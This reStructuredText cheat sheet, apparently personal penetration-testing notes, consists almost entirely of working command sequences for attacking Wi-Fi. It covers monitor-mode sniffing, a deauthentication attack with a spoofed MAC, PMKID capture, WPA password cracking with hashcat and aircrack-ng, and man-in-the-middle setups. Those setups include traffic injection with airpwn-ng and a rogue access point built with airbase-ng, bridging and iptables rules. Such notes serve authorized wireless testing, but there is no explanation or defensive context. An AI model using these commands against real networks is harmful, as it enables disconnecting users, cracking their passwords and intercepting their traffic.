####
Wifi
####

Sniffing
=========

.. code-block:: bash

  airmon-ng start wlp2s0
  airodump-ng -a -c <channel> --essid <ssid> -w mydump wlp2s0mon
  airodump-ng -a -c <channel> --bssid <ap_mac> -w mydump wlp2s0mon

Deauth attack
=============

.. code-block:: bash

  aireplay-ng --deauth 1 -a <ap_mac> -c <client_mac> -h <spoof_src_mac> wlp2s0mon

PMKID attack
============

.. code-block:: bash

  hcxdumptool -o mydump.pcap -i wlp2s0 --enable_status=3
  hcxpcaptool -z test.16800 mydump.pcap

Cracking
========

* hashcat and dictionary attack

.. code-block:: bash

  hcxpcapngtool ~/balle.pcap-01.cap -o test.16800
  hashcat -m 22000 -w 3 test.16800 mydict.txt

* Bruteforce attack

.. code-block:: bash

  hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'

* Hybrid wordlist and bruteforce

.. code-block:: bash

  hashcat -m 22000 -w 3 -a 7 -o cracked.txt test.16800 '?d?d?d?d?s' mydict.txt

* Or using aircrack

.. code-block:: bash

  aircrack-ng -w rockyou.txt mydump.pcap

* For possible default password generators
* https://hashcat.net/forum/thread-6170.html

* And to generate a wordlist depending on a homepage

.. code-block:: bash

  cewl -d 4 -m 8 <url> -w wordlist.txt


Automated security check
========================

* wifite is your friend
* but manual checks are still better ;)


Man in the middle
=================

* Use wifiphisher
* Or airpwn-ng with wpa2 support 

.. code-block:: bash

  airtun-ng -a <BSSID> -e <ESSID> -p <PSK> <Monitoring NIC>
  ifconfig at0 up
  python3 ./airpwn-ng -i <Injecting NIC> -m at0 --tun --injection payloads/demo --inj man

* airpwn open network

.. code-block:: bash

  python3 ./airpwn-ng -i <Injecting NIC> -m <Monitoring NIC> --injection payloads/demo
  
* Or airbase-ng open network

.. code-block:: bash

  airbase-ng -a <ap_mac> --essid <ssid> -c <channel> wlp2s0
  echo 1 > /proc/sys/net/ipv4/ip_forward
  dnsmasq
  brctl addbr mitm
  brctl addif mitm at0
  brctl addif mitm <inet_iface>
  ifconfig mitm up
  iptables -F
  iptables -F -t nat
  iptables -P INPUT ACCEPT
  iptables -P OUTPUT ACCEPT
  iptables -P FORWARD ACCEPT
  iptables -t nat -A POSTROUTING -o <inet_iface> -j MASQUERADE
  
